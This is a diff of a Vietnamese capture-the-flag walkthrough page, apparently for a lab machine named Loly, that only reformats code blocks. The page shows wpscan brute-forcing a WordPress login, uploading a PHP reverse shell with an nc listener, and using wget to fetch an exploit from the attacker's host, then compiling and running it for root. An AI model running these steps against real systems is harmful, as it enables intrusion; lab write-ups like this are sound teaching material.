@@ -186,8 +186,7 @@ Nhận thấy có một IP lạ là <code>192.168.134.135</code>.</p>
         title="image" /></p>
 <h3 id="enumeration">Enumeration</h3>
 <p>Tiến hành quét các <code>directory</code> bằng <code>dirb</code></p>
-<pre tabindex="0"><code>
-dirb 192.168.134.135
+<pre tabindex="0"><code>dirb 192.168.134.135
 </code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -225,8 +224,7 @@ dirb 192.168.134.135
         title="image" /></p>
 <p>Tiến hành <code>brute force</code> <code>username/password</code> bằng cách sử dụng <code>wpscan</code>.
 Đầu tiên ta tìm <code>username</code>:</p>
-<pre tabindex="0"><code>
-wpscan -url http://loly.lc/wordpress
+<pre tabindex="0"><code>wpscan -url http://loly.lc/wordpress
 </code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -245,8 +243,7 @@ wpscan -url http://loly.lc/wordpress
         alt="https://github.com/g03m0n/pics/assets/130943529/47d34f0c-6e9f-4a02-881e-32b5882241ca"
         title="image" /></p>
 <p><code>Brute force</code> password bằng query:</p>
-<pre tabindex="0"><code>
-wpscan -url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt
+<pre tabindex="0"><code>wpscan -url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt
 </code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -287,8 +284,7 @@ Tiến hành đăng nhập</p>
 <p>Ta có thể tận dụng lỗ hổng này để upload <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener noreffer">reverse-shell</a>
 .
 Mở cổng 9001 trên máy attacker bằng query:</p>
-<pre tabindex="0"><code>
-nc -nvlp 9001
+<pre tabindex="0"><code>nc -nvlp 9001
 </code></pre><p>Bây giờ, truy cập PHP reverse shell bằng cách load lại trang web như hình dưới đây:</p>
 <p><img
         class="lazyload"
@@ -308,8 +304,7 @@ nc -nvlp 9001
         alt="https://github.com/g03m0n/pics/assets/130943529/3c775389-0748-4b91-813c-d3cef95c6030"
         title="image" /></p>
 <p>Có thể nâng cấp shell này python <code>pty</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
 </span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -329,8 +324,7 @@ nc -nvlp 9001
         title="image" /></p>
 <h3 id="privilege-escalation">Privilege Escalation</h3>
 <p>Đầu tiên, ta thử kiểm tra phiên bản <code>kernel</code> của machine</p>
-<pre tabindex="0"><code>
-uname -a
+<pre tabindex="0"><code>uname -a
 </code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -349,8 +343,7 @@ uname -a
         alt="https://github.com/g03m0n/pics/assets/130943529/54e58d31-d4b5-482b-ab8b-474f950399f1"
         title="image" /></p>
 <p>Ta <code>wget</code> nó về và <code>compile</code>:</p>
-<pre tabindex="0"><code>
-wget http://192.168.134.134:8000/ex.c
+<pre tabindex="0"><code>wget http://192.168.134.134:8000/ex.c
 gcc ex.c -o ex
 chmod 777 ex
 </code></pre><p><img
@@ -378,8 +371,7 @@ chmod 777 ex
         alt="https://github.com/g03m0n/pics/assets/130943529/0614d379-e22f-4b5a-8e72-d2ee3433eab4"
         title="image" /></p>
 <p>Thực thi file <code>ex</code> bằng query:</p>
-<pre tabindex="0"><code>
-./ex
+<pre tabindex="0"><code>./ex
 </code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
